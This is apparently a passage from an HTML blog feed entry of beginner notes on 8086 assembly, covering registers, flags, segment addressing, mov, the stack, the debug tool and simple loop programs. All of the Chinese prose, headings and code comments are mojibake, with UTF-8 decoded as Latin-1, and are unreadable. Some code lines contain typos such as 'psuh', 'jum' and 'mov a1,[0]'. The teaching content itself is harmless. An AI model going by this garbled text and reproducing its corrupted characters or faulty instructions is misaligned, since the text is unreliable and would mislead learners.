    <content type="html"><![CDATA[<h2 id="ä¸€ã€åŸºç¡€æ¦‚å¿µ"><a href="#ä¸€ã€åŸºç¡€æ¦‚å¿µ" class="headerlink" title="ä¸€ã€åŸºç¡€æ¦‚å¿µ"></a>ä¸€ã€åŸºç¡€æ¦‚å¿µ</h2><h3 id="0-æ±‡ç¼–åŸºç¡€"><a href="#0-æ±‡ç¼–åŸºç¡€" class="headerlink" title="0.æ±‡ç¼–åŸºç¡€"></a>0.æ±‡ç¼–åŸºç¡€</h3><p>èƒ½å¤Ÿè¢«è®¡ç®—æœºç›´æ¥è¯†åˆ«çš„è¯­è¨€ç§°ä¹‹ä¸ºæœºå™¨è¯­è¨€ï¼Œæ¯”å¦‚:<code>00100000</code>è¿™ç§çš„ï¼Œæ±‡ç¼–è¯­è¨€æ˜¯éœ€è¦é€šè¿‡ç¼–è¯‘å™¨è½¬å˜ä¸ºæœºå™¨è¯­è¨€çš„ã€‚</p><p>è®¡ç®—æœºæ„æˆ:è¾“å…¥/è¾“å‡ºè®¾å¤‡ã€å­˜å‚¨å™¨ã€è¿ç®—å™¨ã€æ§åˆ¶å™¨</p><h3 id="1-åŸºç¡€å•ä½ä¿¡æ¯"><a href="#1-åŸºç¡€å•ä½ä¿¡æ¯" class="headerlink" title="1.åŸºç¡€å•ä½ä¿¡æ¯"></a>1.åŸºç¡€å•ä½ä¿¡æ¯</h3><p>bit=ä½ 1/0 è®¡ç®—æœºæœ€å°ä¿¡æ¯å•ä½</p><p>Byte=å­—èŠ‚=8bit=B=1ä¸ªå­˜å‚¨å•å…ƒ è®¡ç®—æœºæœ€å°å­˜å‚¨å•ä½</p><p>å­—(word)=2B=2byte </p><p>å­˜å‚¨åœ°å€å’Œå­˜å‚¨å†…å®¹ä¸€èˆ¬ç”¨16è¿›åˆ¶è¡¨ç¤º</p><p>0x..æˆ–è€…H=åå…­è¿›åˆ¶(0,F)  B=äºŒè¿›åˆ¶(0,1) D=åè¿›åˆ¶(0,9)</p><h3 id="2-CPUå¯¹å­˜å‚¨å™¨çš„è¯»å†™"><a href="#2-CPUå¯¹å­˜å‚¨å™¨çš„è¯»å†™" class="headerlink" title="2.CPUå¯¹å­˜å‚¨å™¨çš„è¯»å†™"></a>2.CPUå¯¹å­˜å‚¨å™¨çš„è¯»å†™</h3><p>ROM=&gt;BOISèŠ¯ç‰‡</p><p>CPUé€šè¿‡åœ°å€æ€»çº¿å¯»å€ã€æ•°æ®æ€»çº¿ä¼ è¾“æ•°æ®ã€æ§åˆ¶æ€»çº¿è¿›è¡Œæ“ä½œæ¥å®Œæˆä¸€äº›å¤„ç†ã€‚</p><p>åœ°å€å¯¹åº”çš„æ˜¯æ•°æ®ï¼Œå› æ­¤åœ°å€æ€»çº¿çš„å®½åº¦ä¹Ÿå°±æ˜¯å…¶ä¸€æ¬¡æœ€å¤§èƒ½å¯»æ‰¾åˆ°å¤šå°‘ä¸ªå­—èŠ‚çš„æ•°æ®ã€‚</p><p>ä¸åŒCPUçš„å¯„å­˜å™¨ä¸ªæ•°æ˜¯ä¸åŒçš„ï¼Œä½†æ˜¯éƒ½æœ‰é€šç”¨å¯„å­˜å™¨</p><h3 id="3-å¯„å­˜å™¨"><a href="#3-å¯„å­˜å™¨" class="headerlink" title="3.å¯„å­˜å™¨"></a>3.å¯„å­˜å™¨</h3><p>æ¦‚å¿µ:CPUä¸­ç¨‹åºå‘˜å¯ä»¥ç”¨æŒ‡ä»¤è¯»å†™çš„éƒ¨ä»¶ï¼Œå¯„å­˜å™¨æ•°é‡æœ‰é™(8086ä¸­æœ‰14ä¸ªå¯„å­˜å™¨)ï¼Œè¯»å†™é€Ÿåº¦å¿«ã€‚</p><p><a href="https://i.loli.net/2018/11/08/5be4379b4ae5f.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2018/11/08/5be4379b4ae5f.png" alt="å±å¹•å¿«ç…§ 2018-11-08 ä¸‹åˆ9.17.52.png"></a></p><p>å†…å­˜å•å…ƒæ˜¯ä¸€ä¸ªå•å…ƒå­˜æ”¾ä¸€ä¸ªå­—èŠ‚(8ä½äºŒè¿›åˆ¶)</p><blockquote><p>é€šç”¨å¯„å­˜å™¨å¯ç”¨äºä¼ é€å’Œæš‚å­˜æ•°æ®ï¼Œä¹Ÿå¯å‚ä¸ç®—æœ¯é€»è¾‘è¿ç®—ï¼Œå¹¶ä¿å­˜è¿ç®—ç»“æœã€‚é™¤æ­¤ä¹‹å¤–ï¼Œå®ƒä»¬è¿˜å„è‡ªå…·æœ‰ä¸€äº›ç‰¹æ®ŠåŠŸèƒ½ã€‚</p></blockquote><p>æ•°æ®æ˜¯ä¸èƒ½ç›´æ¥é€å…¥æ®µåœ°å€å¯„å­˜å™¨(DS)ä¸­çš„;</p><p>16ä½å¯„å­˜å™¨å¯ä»¥æ‹†åˆ†ä¸ºä¸¤ä¸ª8ä½å¯„å­˜å™¨è¿›è¡Œä½¿ç”¨;</p><p><code>mov a1,[0]</code>ï¼Œæ­¤å¤„çš„[]è¯´æ˜æ“ä½œçš„æ˜¯ä¸€ä¸ªå†…å­˜å•å…ƒï¼Œ[0]ä¸­çš„0è¯´æ˜è¿™ä¸ªå†…å­˜å•å…ƒçš„åç§»åœ°å€æ˜¯0ï¼Œå®ƒçš„æ®µåœ°å€é»˜è®¤æ”¾åœ¨dså¯„å­˜å™¨ä¸­ï¼Œä½¿ç”¨æ—¶ä¼šè¢«å»å‡ºæ¥ã€‚</p><p>PS:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ç´¯åŠ å¯„å­˜å™¨åœ¨ä¸åŒä½è®¡ç®—æœºä¸­çš„åå­—ä¸åŒ</span><br><span class="line">16ä½-AX</span><br><span class="line">32ä½-EAX</span><br><span class="line">64ä½-RAX</span><br></pre></td></tr></table></figure><p>16ä½æ•°æ®å¯„å­˜å™¨ä¸èƒ½å­˜æ”¾æ•°æ®åœ°å€ï¼Œä½†æ˜¯32ä½çš„å¯ä»¥</p><h5 id="3-1-æ•°æ®å¯„å­˜å™¨"><a href="#3-1-æ•°æ®å¯„å­˜å™¨" class="headerlink" title="3.1 æ•°æ®å¯„å­˜å™¨"></a>3.1 æ•°æ®å¯„å­˜å™¨</h5><p><a href="https://i.loli.net/2018/11/08/5be4384f283cd.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2018/11/08/5be4384f283cd.png" alt="å±å¹•å¿«ç…§ 2018-11-08 ä¸‹åˆ9.21.03.png"></a></p><h5 id="3-2-æ ‡å¿—å¯„å­˜å™¨"><a href="#3-2-æ ‡å¿—å¯„å­˜å™¨" class="headerlink" title="3.2 æ ‡å¿—å¯„å­˜å™¨"></a>3.2 æ ‡å¿—å¯„å­˜å™¨</h5><p><a href="https://i.loli.net/2018/11/09/5be59269c31cf.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2018/11/09/5be59269c31cf.png" alt="å±å¹•å¿«ç…§ 2018-11-09 ä¸‹åˆ8.54.44.png"></a></p><h6 id="3-2-1è¿ç®—ç»“æœæ ‡å¿—ä½"><a href="#3-2-1è¿ç®—ç»“æœæ ‡å¿—ä½" class="headerlink" title="3.2.1è¿ç®—ç»“æœæ ‡å¿—ä½"></a>3.2.1è¿ç®—ç»“æœæ ‡å¿—ä½</h6><p><strong>ZFæ ‡å¿—ï¼ˆZeroFlag</strong>ï¼‰ï¼š</p><p>é›¶ä½æ ‡å¿—ä½ï¼Œå®ƒè®°å½•ç›¸å…³æŒ‡ä»¤æ‰§è¡Œåçš„ç»“æœæ˜¯å¦ä¸º0ï¼Œå¦‚æœæ˜¯0ï¼Œé‚£ä¹ˆZF=1ï¼Œå¦‚æœç»“æœä¸ä¸º0ï¼Œé‚£ä¹ˆZF=0ã€‚</p><p><strong>PFæ ‡å¿—ï¼ˆParityFlag</strong>ï¼‰ï¼š</p><p>å¥‡å¶æ ‡å¿—ä½ï¼Œå®ƒè®°å½•ç›¸å…³æŒ‡ä»¤æ‰§è¡Œåï¼Œå…¶ç»“æœçš„æ‰€æœ‰äºŒè¿›åˆ¶ä½ä¸­1ä¸ªä¸ªæ•°æ˜¯å¦ä¸ºå¶æ•°ï¼Œå¦‚æœæ˜¯å¶æ•°ï¼ŒPF=1ï¼Œåä¹‹ä¸º0ã€‚</p><p><strong>SFæ ‡å¿—ï¼ˆSignFlag</strong>ï¼‰ï¼š</p><p>ç¬¦å·æ ‡å¿—ä½ï¼Œå®ƒè®°å½•ç›¸å…³æŒ‡ä»¤æ‰§è¡Œåï¼Œå…¶ç»“æœæ˜¯å¦ä¸ºè´Ÿï¼Œå¦‚æœç»“æœä¸ºè´Ÿï¼ŒSF=1ï¼Œå¦‚æœéè´Ÿï¼ŒSF=0ã€‚</p><p><strong>CFæ ‡å¿—ï¼ˆCarryè¿›ä½ï¼ŒFlagæ ‡å¿—</strong>ï¼‰ï¼š</p><p>è¿›ä½æ ‡å¿—ä½ï¼Œä¸€èˆ¬æƒ…å†µï¼Œè¿›è¡Œæ— ç¬¦å·è¿ç®—æ—¶ï¼Œå®ƒè®°å½•è¿ç®—ç»“æœçš„æœ€é«˜ä½å‘æ›´é«˜ä½çš„è¿›ä½å€¼ï¼Œæˆ–ä»æ›´é«˜ä½çš„å€Ÿä½å€¼ï¼Œå¦‚æœè¿ç®—ç»“æœçš„æœ€é«˜ä½äº§ç”Ÿäº†ä¸€ä¸ªè¿›ä½æˆ–å€Ÿä½ï¼Œé‚£ä¹ˆå…¶å€¼ä¸º1ï¼Œå¦åˆ™å…¶å€¼ä¸º0ã€‚</p><p><strong>OFæ ‡å¿—ï¼ˆOverflowæº¢å‡ºï¼ŒFlagæ ‡å¿—ï¼‰</strong>ï¼š</p><p>æº¢å‡ºæ ‡å¿—ä½ï¼Œåœ¨è¿›è¡Œæœ‰ç¬¦å·æ•°è¿ç®—çš„æ—¶å€™ï¼Œå¦‚æœç»“æœè¶…å‡ºäº†æœºå™¨æ‰€èƒ½è¡¨ç¤ºçš„èŒƒå›´ç§°ä¸ºæº¢å‡ºï¼ŒOFçš„å€¼è¢«ç½®ä¸º1ï¼Œå¦åˆ™OFçš„å€¼ä¸º0ã€‚</p><p>æ³¨æ„ï¼šè¿™é‡Œæ‰€è¯´çš„æº¢å‡ºï¼Œåªæ˜¯å¯¹æœ‰ç¬¦å·è¿ç®—è€Œè¨€ã€‚</p><h6 id="3-2-2çŠ¶æ€æ§åˆ¶æ ‡å¿—ä½"><a href="#3-2-2çŠ¶æ€æ§åˆ¶æ ‡å¿—ä½" class="headerlink" title="3.2.2çŠ¶æ€æ§åˆ¶æ ‡å¿—ä½"></a>3.2.2çŠ¶æ€æ§åˆ¶æ ‡å¿—ä½</h6><p><strong>TFæ ‡å¿—ï¼ˆTrapFlagï¼‰</strong>ï¼š</p><p>è¿½è¸ªæ ‡å¿—ä½ï¼Œå½“è¿½è¸ªæ ‡å¿—è¢«ç½®ä¸º1æ—¶ï¼ŒCPUè¿›å…¥å•æ­¥æ‰§è¡Œæ–¹å¼ï¼Œå³æ¯æ‰§è¡Œä¸€æ¡æŒ‡ä»¤äº§ç”Ÿä¸€ä¸ªå•æ­¥ä¸­æ–­è¯·æ±‚ï¼Œè¿™ä¸­æ–¹å¼ä¸»è¦ç”¨äºç¨‹åºçš„è°ƒè¯•ã€‚</p><p><strong>IFæ ‡å¿—ï¼ˆInterrupt-enable Flag</strong>ï¼‰ï¼š</p><p>ä¸­æ–­å…è®¸æ ‡å¿—ä½ï¼Œç”¨æ¥å†³å®šCPUæ˜¯å¦å“åº”CPUå¤–éƒ¨çš„å¯å±è”½ä¸­æ–­å‘å‡ºçš„ä¸­æ–­è¯·æ±‚ï¼Œä½†ä¸ç®¡è¯¥æ ‡å¿—ä¸ºä½•å€¼ï¼ŒCPUéƒ½å¿…é¡»å“åº”CPUå¤–éƒ¨çš„ä¸å¯å±è”½ä¸­æ–­æ‰€å‘å‡ºçš„ä¸­æ–­è¯·æ±‚ï¼Œä»¥åŠCPUå†…éƒ¨äº§ç”Ÿçš„ä¸­æ–­è¯·æ±‚ã€‚</p><p>å½“IF=1æ—¶ï¼ŒCPUå¯ä»¥ç›¸åº”CPUå¤–éƒ¨çš„å¯å±è”½ä¸­æ–­å‘å‡ºçš„ä¸­æ–­è¯·æ±‚ã€‚</p><p>å½“IF=0æ—¶ï¼ŒCPUä¸å“åº”CPUå¤–éƒ¨çš„å¯å±è”½ä¸­æ–­å‘å‡ºçš„ä¸­æ–­è¯·æ±‚ã€‚</p><p>CPUçš„æŒ‡ä»¤ç³»ç»Ÿä¸­ä¹Ÿæœ‰ä¸“é—¨çš„æŒ‡ä»¤æ¥æ”¹å˜æ ‡å¿—ä½IFçš„å€¼ã€‚</p><h3 id="4-ç‰©ç†åœ°å€"><a href="#4-ç‰©ç†åœ°å€" class="headerlink" title="4.ç‰©ç†åœ°å€"></a>4.ç‰©ç†åœ°å€</h3><p>é€šå¸¸æ–‡ä»¶ä¸­è‡³å°‘å«æœ‰ä¸¤ä¸ªæ®µ:ä»£ç æ®µ(å­˜å‚¨ç¨‹åºçš„æŒ‡ä»¤â€“å¯è¯»ï¼Œä¸å¯å†™ï¼Œå¯æ‰§è¡Œ)ã€æ•°æ®æ®µ(å­˜å‚¨éœ€è¦çš„æ•°æ®çš„æŒ‡ä»¤â€“å¯è¯»ï¼Œå¯å†™ï¼Œå¯æ‰§è¡Œ)</p><p>äºŒè¿›åˆ¶å·¦ç§»Nä½ç›¸å½“äºè¿™ä¸ªäºŒè¿›åˆ¶æ•°ä¹˜ä»¥2çš„Næ¬¡æ–¹</p><p>ç‰©ç†åœ°å€=æ®µåœ°å€*16(åˆç§°åŸºå€)+åç§»åœ°å€</p><p>ä»»ä½•æ—¶åˆ»8086CPUéƒ½ä¼šå°†CS:IPæŒ‡å‘çš„å†…å®¹ä½œä¸ºå³å°†æ‰§è¡Œçš„æŒ‡ä»¤(å¯ä»¥ä½¿ç”¨<code>jmp</code>å¯¹å…¶è¿›è¡Œä¿®æ”¹æ“ä½œ)</p><p>ä¸€ä¸ªç‰©ç†åœ°å€å¯ä»¥å¯¹åº”å¤šä¸ªé€»è¾‘åœ°å€ï¼Œåœ¨ç¼–ç¨‹çš„æ—¶å€™ä½¿ç”¨çš„æ˜¯é€»è¾‘åœ°å€(=æ®µåŸºåœ°å€+æ®µå†…åç§»åœ°å€)</p><h3 id="5-æ®µåœ°å€"><a href="#5-æ®µåœ°å€" class="headerlink" title="5.æ®µåœ°å€"></a>5.æ®µåœ°å€</h3><p><a href="https://i.loli.net/2018/11/08/5be43c4837204.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2018/11/08/5be43c4837204.png" alt="å±å¹•å¿«ç…§ 2018-11-08 ä¸‹åˆ9.38.04.png"></a></p><p>å¯ä»¥å°†è‹¥å¹²åœ°å€è¿ç»­çš„å†…å­˜å•å…ƒçœ‹åšä¸€ä¸ªæ®µ</p><p>8086CPUæœ‰4ä¸ªæ®µå¯„å­˜å™¨ï¼Œæ¯ä¸ªæ®µå¯„å­˜å™¨ç”¨æ¥ç¡®å®šä¸€ä¸ªé€»è¾‘æ®µçš„èµ·å§‹ä½ç½®ï¼Œæ¯ç§é€»è¾‘æ®µå‡æœ‰å„è‡ªçš„ç”¨é€”ï¼š</p><p> CSï¼ˆä»£ç æ®µï¼‰ï¼šæŒ‡æ˜ä»£ç çš„èµ·å§‹åœ°å€</p><pre><code>åˆ©ç”¨CSï¼šIPå–å¾—ä¸‹ä¸€æ¡è¦æ‰§è¡Œçš„æŒ‡ä»¤</code></pre><p> SSï¼ˆå †æ ˆæ®µï¼‰ï¼šæŒ‡æ˜å †æ ˆæ®µçš„èµ·å§‹åœ°å€</p><pre><code>åˆ©ç”¨SSï¼šSPæ“ä½œå †æ ˆé¡¶çš„æ•°æ®</code></pre><p> DSï¼ˆæ•°æ®æ®µï¼‰ï¼šæŒ‡æ˜æ•°æ®çš„èµ·å§‹åœ°å€</p><pre><code>åˆ©ç”¨DSï¼šEAå­˜å–æ•°æ®æ®µä¸­çš„æ•°æ®</code></pre><p> ESï¼ˆé™„åŠ æ®µï¼‰ï¼šæŒ‡æ˜é™„åŠ æ®µçš„èµ·å§‹åœ°å€</p><pre><code>åˆ©ç”¨ESï¼šEAå­˜å–é™„åŠ æ®µä¸­çš„æ•°æ®</code></pre><p>PS:</p><p>1.åœ¨å†…å­˜ä¸­ï¼ŒæŒ‡ä»¤å’Œæ•°æ®æ²¡æœ‰ä»»ä½•åŒºåˆ«ï¼Œéƒ½æ˜¯è€ŒäºŒè¿›åˆ¶ä¿¡æ¯ï¼Œåªæ˜¯CPUå°†æœ‰çš„æ•°æ®çœ‹æˆæŒ‡ä»¤ï¼Œæœ‰çš„çœ‹æˆæ•°æ®</p><p>2.ä¸€èˆ¬çš„å¯„å­˜å™¨ï¼Œå¦‚AXï¼Œå¯ä»¥ä½¿ç”¨<code>mov ax,123</code>æ¥å®Œæˆå¯¹å…¶ä¸­æ•°å€¼çš„ä¿®æ”¹ã€‚ä½†æ˜¯åƒCS,IPè¿™æ ·çš„å¯„å­˜å™¨(ç”¨æ¥ä»å†…å­˜ä¸­å¯»å€æ‰§è¡ŒæŒ‡ä»¤çš„)åªèƒ½ä½¿ç”¨è½¬ç§»æŒ‡ä»¤æ¥ä¿®æ”¹ï¼Œæ¯”å¦‚jmpâ€“<code>jum [æ®µåœ°å€:]åç§»åœ°å€</code>ï¼Œæ®µåœ°å€å’Œâ€™:â€™ç¼ºçœå°†åªä¿®æ”¹IPçš„å€¼</p><p>3.æ“ä½œä¸­å¦‚æœæ²¡æœ‰æŒ‡æ˜æ®µå‰ç¼€ï¼Œåˆ™ä¸€èˆ¬è®¿é—®çš„æ˜¯DS</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov ax,[1000H]</span><br><span class="line">;è¿™ä¸¤è¡Œéƒ½æ˜¯ç­‰ä»·çš„</span><br><span class="line">mov ax,ds:[1000H]</span><br></pre></td></tr></table></figure><h3 id="6-mov-add-subæŒ‡ä»¤"><a href="#6-mov-add-subæŒ‡ä»¤" class="headerlink" title="6.mov,add,subæŒ‡ä»¤"></a>6.mov,add,subæŒ‡ä»¤</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mov å¯„å­˜å™¨,æ•°æ®</span><br><span class="line">æ¯”å¦‚:</span><br><span class="line">mov ax,8</span><br><span class="line">mov å¯„å­˜å™¨ï¼Œå¯„å­˜å™¨</span><br><span class="line">æ¯”å¦‚:</span><br><span class="line">mov ax,bx</span><br><span class="line">mov å¯„å­˜å™¨ï¼Œå†…å­˜å•å…ƒ</span><br><span class="line">æ¯”å¦‚:</span><br><span class="line">mov ax,[0]</span><br><span class="line">mov å†…å­˜å•å…ƒï¼Œå¯„å­˜å™¨</span><br><span class="line">æ¯”å¦‚:</span><br><span class="line">mov [0],ax</span><br><span class="line">mov æ®µå¯„å­˜å™¨ï¼Œå¯„å­˜å™¨ //ç›¸åä¹Ÿå¯¹</span><br><span class="line">æ¯”å¦‚:</span><br><span class="line">mov ds,ax</span><br></pre></td></tr></table></figure><p>å…³äºmovçš„æ“ä½œå¯¹è±¡çš„è¯´æ˜:<br><a href="https://i.loli.net/2018/11/11/5be8064f9e0e7.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2018/11/11/5be8064f9e0e7.png" alt="å±å¹•å¿«ç…§ 2018-11-11 ä¸‹åˆ4.59.54.png"></a></p><p>PS:</p><p>æŒ‡ä»¤=æ“ä½œç (+æ“ä½œæ•°)</p><h3 id="7-æ ˆ-åå…¥å…ˆå‡º"><a href="#7-æ ˆ-åå…¥å…ˆå‡º" class="headerlink" title="7.æ ˆ(åå…¥å…ˆå‡º)"></a>7.æ ˆ(åå…¥å…ˆå‡º)</h3><p>ä¸¤ä¸ªå…³é”®å¯„å­˜å™¨:SS,SP-&gt;æ®µåœ°å€,æ®µåç§»åœ°å€ã€‚è¿™å¯¹å¯„å­˜å™¨å°†ä¼šæŒ‡å‡ºæ ˆé¡¶åœ°å€ã€‚æ ˆå¤§å°ç”±æˆ‘ä»¬è‡ªå·±å®‰æ’æ‰€ä»¥è¦å°å¿ƒè¶…ç•Œé—®é¢˜ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mov ax,0123H</span><br><span class="line">psuh ax</span><br><span class="line">mov bx,2266H</span><br><span class="line">push bx</span><br><span class="line">pop ax //2266H</span><br><span class="line">pop bx //0123H</span><br></pre></td></tr></table></figure><p>PS:</p><p>å †æ ˆæ“ä½œéƒ½æ˜¯ä»¥å­—(2å­—èŠ‚)ä¸ºå•ä½æ“ä½œçš„ã€‚</p><h3 id="8-å¼€å‘ç¯å¢ƒé…ç½®"><a href="#8-å¼€å‘ç¯å¢ƒé…ç½®" class="headerlink" title="8.å¼€å‘ç¯å¢ƒé…ç½®"></a>8.å¼€å‘ç¯å¢ƒé…ç½®</h3><p>win7åŠä»¥ä¸Šç³»ç»Ÿéƒ½æ²¡æœ‰debugäº†ï¼Œæ‰€ä»¥éƒ½éœ€è¦è¿™ä¸ªDOSBOX</p><p><a href="https://www.cnblogs.com/skyen/p/9721471.html" target="_blank" rel="noopener">MAC OSç¯å¢ƒä¸‹DOSBOXæ±‡ç¼–ç¯å¢ƒçš„æ­å»º</a></p><h3 id="9-debug"><a href="#9-debug" class="headerlink" title="9.debug"></a>9.debug</h3><p><strong>åŠŸèƒ½</strong>:</p><ol><li>å¯ä»¥æŸ¥çœ‹CPUå¯„å­˜å™¨çš„å„ç§å†…å®¹</li><li>å¯ä»¥æŸ¥çœ‹å†…å­˜çš„ä½¿ç”¨æƒ…å†µ</li><li>å¯ä»¥åœ¨æœºå™¨ç çº§åˆ«è·Ÿè¸ªç¨‹åºçš„è¿è¡Œ</li></ol><p><strong>å¸¸ç”¨æ“ä½œ</strong>:<br><a href="https://i.loli.net/2018/11/08/5be44eaf49624.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2018/11/08/5be44eaf49624.png" alt="å±å¹•å¿«ç…§ 2018-11-08 ä¸‹åˆ10.56.20.png"></a></p><h2 id="äºŒã€ç¨‹åº"><a href="#äºŒã€ç¨‹åº" class="headerlink" title="äºŒã€ç¨‹åº"></a>äºŒã€ç¨‹åº</h2><h3 id="0-ç¨‹åºè¿è¡Œ"><a href="#0-ç¨‹åºè¿è¡Œ" class="headerlink" title="0.ç¨‹åºè¿è¡Œ"></a>0.ç¨‹åºè¿è¡Œ</h3><p>1.ç¨‹åºåŠ è½½åˆ°å†…å­˜</p><p>2.CPUä½¿ç”¨å¯„å­˜å™¨CS:IPæ‰¾åˆ°ç¨‹åºå³å°†æ‰§è¡ŒæŒ‡ä»¤çš„ä½ç½®</p><h3 id="1-ä¼ªæŒ‡ä»¤"><a href="#1-ä¼ªæŒ‡ä»¤" class="headerlink" title="1.ä¼ªæŒ‡ä»¤"></a>1.ä¼ªæŒ‡ä»¤</h3><p>ä¼ªæŒ‡ä»¤ä¸å¯¹åº”æœºå™¨ç ï¼Œç”±ç¼–è¯‘å™¨è¿›è¡Œå¤„ç†</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">// å°†åå­—ä¸ºcodesg(æ ‡å·   )çš„ä»£ç æ®µè·Ÿcså¯„å­˜å™¨è”ç³»èµ·æ¥</span><br><span class="line">assume cs:codesg</span><br><span class="line"></span><br><span class="line">// XXX segment åˆ° XXX endsæ ‡è¯†äº†ä¸€ä¸ªä»£ç æ®µ</span><br><span class="line"></span><br><span class="line">codesg segment</span><br><span class="line"></span><br><span class="line">    mov ax,0123H</span><br><span class="line">    ...</span><br><span class="line">    // ä¸‹é¢è¿™ä¸¤æ®µå®ç°äº†ç¨‹åºè¿”å›</span><br><span class="line">    mov ax,4c00H</span><br><span class="line">    int 21H</span><br><span class="line">    </span><br><span class="line">codesg ends</span><br><span class="line"></span><br><span class="line">end // æ±‡ç¼–ç¨‹åºç»“æŸçš„æ ‡å¿—</span><br></pre></td></tr></table></figure><p>å°†ä»£ç ä¿å­˜ä¸ºasmæ ¼å¼çš„æ–‡ä»¶åå°±å¯ä»¥é‡‡ç”¨å¾®è½¯çš„masmæ±‡ç¼–ç¼–è¯‘å™¨æ¥ç¼–è¯‘æ±‡ç¼–ä»£ç ã€‚(æ³¨æ„ç¼–è¯‘åç”Ÿæˆçš„æ˜¯filename.objè¿˜éœ€è¦å°†å…¶é“¾æ¥ä¸ºå¯æ‰§è¡Œæ–‡ä»¶filename.exeï¼Œè¿æ¥å¯ä»¥ä½¿ç”¨å¾®è½¯çš„Overlay Linker3.60è¿æ¥å™¨)</p><h6 id="2-bx-å’ŒloopæŒ‡ä»¤"><a href="#2-bx-å’ŒloopæŒ‡ä»¤" class="headerlink" title="2.[bx]å’ŒloopæŒ‡ä»¤"></a>2.[bx]å’ŒloopæŒ‡ä»¤</h6><p><code>mov ax,[bx]</code><br>åŠŸèƒ½:bxä¸­å­˜æ”¾çš„æ•°æ®ä½œä¸ºä¸€ä¸ªåç§»åœ°å€EA,æ®µåœ°å€SAé»˜è®¤åœ¨dsä¸­ï¼Œå°†SE:EAå¤„çš„æ•°æ®é€å…¥axä¸­ï¼Œå³(ax)=((ds)*16+(dx))</p><p><code>inc bx</code> æ˜¯æŒ‡bxä¸­çš„å†…å®¹åŠ 1</p><p>PS:ç”¨â€™()â€™æ¥è¡¨ç¤ºä¸€ä¸ªå¯„å­˜å™¨æˆ–è€…å†…å­˜å•å…ƒä¸­çš„å†…å®¹ã€‚æ¯”å¦‚(ax)å°±è¡¨ç¤ºå¯„å­˜å™¨axä¸­çš„å†…å®¹</p><p>loopæŒ‡ä»¤å®ç°å¾ªç¯å…¬å¸ƒåŠŸèƒ½,cxä¸­ä¿å­˜äº†å¾ªç¯æ¬¡æ•°</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">assume cs:codesg</span><br><span class="line"></span><br><span class="line">codesg segment</span><br><span class="line"></span><br><span class="line">    mov ax,0123H</span><br><span class="line">    mov cx,11</span><br><span class="line">    // sæ˜¯ä¸€ä¸ªæ ‡å·</span><br><span class="line">    // åªè¦cxä¸­çš„å€¼ä¸ä¸º0ï¼Œåˆ™loopéƒ½å›å»æ‰§è¡Œæ ‡å·så‡ºçš„å€¼</span><br><span class="line">s:  add ax,ax</span><br><span class="line">    loop s</span><br><span class="line">    mov ax,4c00H</span><br><span class="line">    int 21H</span><br><span class="line">    </span><br><span class="line">codesg ends</span><br><span class="line"></span><br><span class="line">end</span><br></pre></td></tr></table></figure><h6 id="3-dwå’Œend"><a href="#3-dwå’Œend" class="headerlink" title="3.dwå’Œend"></a>3.dwå’Œend</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">assume cs:codesg</span><br><span class="line"></span><br><span class="line">codesg segment</span><br><span class="line"></span><br><span class="line">        dw 0123h,0456h,0789h,0defh</span><br><span class="line">start:  mov ax,0123H</span><br><span class="line">        mov cx,11</span><br><span class="line">        // sæ˜¯ä¸€ä¸ªæ ‡å·</span><br><span class="line">        // åªè¦cxä¸­çš„å€¼ä¸ä¸º0ï¼Œåˆ™loopéƒ½å›å»æ‰§è¡Œæ ‡å·så‡ºçš„å€¼</span><br><span class="line">s:      add ax,ax</span><br><span class="line">        loop s</span><br><span class="line">        mov ax,4c00H</span><br><span class="line">        int 21H</span><br><span class="line">    </span><br><span class="line">codesg ends</span><br><span class="line"></span><br><span class="line">end start</span><br></pre></td></tr></table></figure><p><code>dw</code>å®šä¹‰äº†å¤šä¸ªå­—ç¬¦å‹æ•°æ®ï¼Œæ¯ä¸ªæ•°æ®å 